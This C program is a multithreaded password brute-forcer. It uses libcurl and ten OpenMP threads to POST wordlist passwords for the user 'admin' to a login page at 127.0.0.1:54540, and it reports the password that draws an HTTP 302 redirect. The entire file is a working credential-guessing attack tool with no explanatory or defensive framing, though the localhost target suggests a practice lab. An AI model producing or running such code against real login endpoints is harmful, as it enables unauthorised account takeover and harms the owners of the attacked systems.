#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <omp.h>

#define MAX_PASSWORD_LEN 100
#define PASSWORDS_COUNT 10000

size_t dummy_write_callback(void *ptr, size_t size, size_t nmemb, void *stream) {
    return size * nmemb; // Do nothing with the data
}

void readPasswords(char passwords[][MAX_PASSWORD_LEN], const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("File opening failed");
        exit(1);
    }

    int i = 0;
    while (fgets(passwords[i], MAX_PASSWORD_LEN, file) && i < PASSWORDS_COUNT) {
        size_t len = strcspn(passwords[i], "\r\n");
        passwords[i][len] = 0; // Replace newline with null terminator
        i++;
    }

    fclose(file);
}

int main() {
    omp_set_num_threads(10);
    char (*passwords)[MAX_PASSWORD_LEN] = malloc(PASSWORDS_COUNT * MAX_PASSWORD_LEN);
    if (!passwords) {
        perror("Failed to allocate memory for passwords");
        return 1;
    }

    readPasswords(passwords, "wordlist.txt");

    int passwordFound = 0;

    #pragma omp parallel shared(passwordFound, passwords)
    {
        CURL *curl;
        CURLcode res;
        long response_code = 0;
        char postfields[MAX_PASSWORD_LEN + 20];

        int thread_id = omp_get_thread_num();
        int num_threads = omp_get_num_threads();
        int passwords_per_thread = PASSWORDS_COUNT / num_threads;
        int start_index = thread_id * passwords_per_thread;
        int end_index = (thread_id + 1) * passwords_per_thread;

        for (int i = start_index; i < end_index; i++) {
            if (passwordFound) {
                continue; // Skip remaining iterations if password is found
            }

            curl = curl_easy_init();
            if (curl) {
                sprintf(postfields, "username=admin&password=%s", passwords[i]);
                curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:54540/login.php");
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, dummy_write_callback);

                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                } else {
                    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                    if (response_code == 302) {
                        #pragma omp critical
                        {
                            if (!passwordFound) {
                                passwordFound = 1;
                                printf("Correct password found by thread %d: %s\n", thread_id, passwords[i]);
                            }
                        }
                    }
                }
                curl_easy_cleanup(curl);
            } else {
                fprintf(stderr, "Failed to initialize curl\n");
            }
        }
    }

    free(passwords);
    return 0;
}
